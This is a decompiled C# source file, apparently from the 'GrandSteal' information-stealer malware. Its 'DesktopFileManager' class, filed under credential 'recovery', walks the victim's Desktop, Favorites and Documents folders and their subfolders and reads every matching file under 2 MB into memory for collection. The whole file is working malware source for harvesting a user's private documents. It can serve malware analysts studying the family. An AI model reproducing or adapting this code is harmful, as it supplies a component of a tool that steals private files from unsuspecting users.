using System;
using System.Collections.Generic;
using System.IO;
using GrandSteal.Client.Models.Credentials;
using GrandSteal.SharedModels.Models;

namespace GrandSteal.Client.Data.Recovery
{
	// Token: 0x0200001D RID: 29
	public class DesktopFileManager : ICredentialsManager<DesktopFile>
	{
		// Token: 0x1700003E RID: 62
		// (get) Token: 0x060000D1 RID: 209 RVA: 0x00002666 File Offset: 0x00000866
		// (set) Token: 0x060000D2 RID: 210 RVA: 0x0000266E File Offset: 0x0000086E
		public IEnumerable<string> DesktopFileExtensions { get; set; }

		// Token: 0x1700003F RID: 63
		// (get) Token: 0x060000D3 RID: 211 RVA: 0x00002677 File Offset: 0x00000877
		public IList<string> Directories { get; }

		// Token: 0x060000D4 RID: 212 RVA: 0x00006648 File Offset: 0x00004848
		public DesktopFileManager()
		{
			this.Directories = new List<string>();
			try
			{
				this.Directories.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
				this.Directories.Add(Environment.GetFolderPath(Environment.SpecialFolder.Favorites));
				this.Directories.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
				foreach (string item in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)))
				{
					this.Directories.Add(item);
				}
				foreach (string item2 in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Favorites)))
				{
					this.Directories.Add(item2);
				}
				foreach (string item3 in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Personal)))
				{
					this.Directories.Add(item3);
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x00006734 File Offset: 0x00004934
		public IEnumerable<DesktopFile> GetAll()
		{
			List<DesktopFile> list = new List<DesktopFile>();
			if (this.DesktopFileExtensions == null)
			{
				return list;
			}
			foreach (string path in this.Directories)
			{
				try
				{
					foreach (string searchPattern in this.DesktopFileExtensions)
					{
						foreach (string fileName in Directory.GetFiles(path, searchPattern, SearchOption.TopDirectoryOnly))
						{
							try
							{
								FileInfo fileInfo = new FileInfo(fileName);
								if (fileInfo.Length <= 2097152L)
								{
									list.Add(new DesktopFile
									{
										FileData = File.ReadAllBytes(fileInfo.FullName),
										Filename = fileInfo.Name
									});
								}
							}
							catch (Exception arg)
							{
								Console.WriteLine("1:" + arg);
							}
						}
					}
				}
				catch
				{
				}
			}
			return list;
		}
	}
}
